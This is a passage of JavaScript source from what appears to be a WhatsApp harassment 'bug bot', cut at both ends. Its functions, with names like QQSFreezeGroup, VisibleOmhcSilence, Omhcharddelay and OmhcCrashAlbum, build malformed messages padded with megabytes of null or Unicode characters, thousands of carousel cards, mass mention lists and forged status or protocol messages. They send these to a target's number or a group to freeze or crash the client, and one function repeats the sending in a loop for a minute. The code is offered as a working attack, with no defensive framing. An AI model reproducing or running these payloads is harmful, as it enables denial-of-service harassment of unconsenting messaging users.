        "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
        "fileLength": "175891",
        "seconds": 1,
        "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
        "height": 848,
        "width": 480,
        "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
        "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
        "mediaKeyTimestamp": "1765345955",
        "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
        "annotations": [{
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMusic": {
              "musicContentMediaId": "3312808138872179",
              "songId": "270259430421407",
              "author": "ြ".repeat(200000),
              "title": " Freeze ",
              "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
              "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
              "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
              "artistAttribution": "",
              "countryBlocklist": "",
              "isExplicit": true,
              "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
              "musicSongStartTimeInMs": "10149",
              "derivedContentStartTimeInMs": "0",
              "overlapDurationInMs": "1000"
            }
          },
          "embeddedAction": true
        }]
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await wait(500);

    const imageMessage = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
      fileLength: 162903,
      height: 1080,
      width: 1080,
      mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
      fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
      directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
      mediaKeyTimestamp: 1775033718,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" },
      scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
      scanLengths: [ 10365, 39303, 40429, 72806 ],
      midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    };

    let cards2 = [];
    for (let z = 0; z < 5000; z++) {
      cards2.push({
        header: { imageMessage, hasMediaAttachment: true },
        nativeFlowMessage: { messageParamsJson: "\0" }
      });
    }

    const firstMsg = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const secondMsg = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const thirdMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "memeg", format: "DEFAULT" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null })
                }
              ],
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, firstMsg.message, { participant: { jid: target } });
    await sock.relayMessage(target, secondMsg.message, { participant: { jid: target } });
    await sock.relayMessage(target, thirdMsg, { participant: { jid: target } });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          protocolMessage: {
            type: 25,
            key: { remoteJid: target, fromMe: true, id: "HARD_TERMINATE" }
          }
        }
      }
    }, { participant: { jid: target } });

    await sock.relayMessage("status@broadcast", {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000".repeat(500000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(9999999),
              version: 3
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    console.log(`Done: ${target}`);

  } catch (error) {
    console.error(error.message);
  }
}

async function QQSFreezeGroup(sock, groupJid) {
const QQSGB1 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "QQS SILENCE",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Silence1 = generateWAMessageFromContent(groupJid, QQSGB1, {});

await sock.relayMessage(groupJid, Silence1.message, {
messageId: Silence1.key.id
})

await new Promise(resolve => setTimeout(resolve, 200));

const QQSGB2 = {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "QQS SILENCE!",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Silence2 = generateWAMessageFromContent(groupJid, QQSGB2, {});

await sock.relayMessage(groupJid, Silence2.message, {
messageId: Silence2.key.id
})

await new Promise(resolve => setTimeout(resolve, 200));

const QQSGB3 = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "QQSSILENCE",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              },
            },
          },
        },
      },
    },
  };

const Silence3 = generateWAMessageFromContent(groupJid, QQSGB3, {});

await sock.relayMessage(groupJid, Silence3.message, {
messageId: Silence3.key.id
})

  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
  
  const Silence4 = await generateWAMessageFromContent(groupJid, msg, {});
  await sock.relayMessage(groupJid, Silence4.message, {
    messageId: Silence4.key.id
  });
}


async function VisibleOmhcSilence(sock, target, mention, ptcp = true) {
const audioMessage = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 2000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  const msg = generateWAMessageFromContent(target, audioMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined
          }
        ]
      }
    );
  }
  
  const tagVisible = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c&mms3=true",
               mimetype: "image/jpeg",
               caption: "YakuzaXsilence",
               fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
               fileLength: "634893",
               height: 1022,
               width: 1080,
               mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
               fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
               directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg?ccb=9-4&oh=01_Q5Aa4wEJA1yWx93n2LsHl57Q5gRboTzP0JFzapGd127AkxlN7Q&oe=6A6873B3&_nc_sid=e6ed6c",
               mediaKeyTimestamp: "1782643133",
                 jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQAERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                 hasMediaAttachment: true
               }
            },
            body: {
            text: "\x10" + "\u0000".repeat(1045000)
          },
          nativeFlowMessage: {
            name: "voice_call",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }
  await sock.relayMessage(target, tagVisible, {
  }, { noSelfSync: true }
 );
  
  const OneDelay = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: OneDelay.message,
     },
    }, ptcp ? 
    { 
      messageId: OneDelay.key.id, 
      participant: { jid: target} 
    } : { messageId: OneDelay.key.id }
  );
  
  const VisibleAttack = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "hi kidz", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: VisibleAttack.message,
     },
    }, ptcp ? 
    { 
      messageId: VisibleAttack.key.id, 
      participant: { jid: target} 
    } : { messageId: VisibleAttack.key.id }
  );
  
  const TrueAttack = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: TrueAttack.message,
     },
    }, ptcp ? 
    { 
      messageId: TrueAttack.key.id, 
      participant: { jid: target} 
    } : { messageId: TrueAttack.key.id }
  );
}

async function Omhcharddelay(sock, target, mention) {
const x = "\u0000".repeat(9000);
const Silence = "999999999999";
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const Silent = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: x,
          name: x,
          publisher: x,
          fileLength: Silence,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",

          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          },
         },
        }
      }
    }
  };

  await sock.relayMessage(target, Silent, {
    participant: { jid: target }
  });
}

const mentiondellay = Array.from({ length: 1900 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const simple = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: mentiondellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };
  const Massagemention = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 3,
    },
  };
  
  const omhc = generateWAMessageFromContent(target, simple, Massagemention, {});

  await sock.relayMessage("status@broadcast", omhc.message, {
    messageId: omhc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: omhc.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ mention Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }


  const msg22 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "YAKUZA X SILENCE 🥀",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg22.message, {
    messageId: msg22.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u0003",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    
    const msg1 = generateWAMessageFromContent(target, generateMessage, {});
    
  const Silencedellay = Array.from({ length: 1902 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: Silencedellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };
  const MassageSilence = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg2 = generateWAMessageFromContent(target, MSG, MassageSilence, {});

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Silence Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function OmhcCrashAlbum(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: {
              participant: "131355550002@s.whatsapp.net",
              remoteJid: "status@broadcast",
              id: ""
            },
            type: "REVOKE"
          }
        }
      },
      message: {
        messageContextInfo: {
          mentionedJid: [target]
        },
        viewOnceMessageV2: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
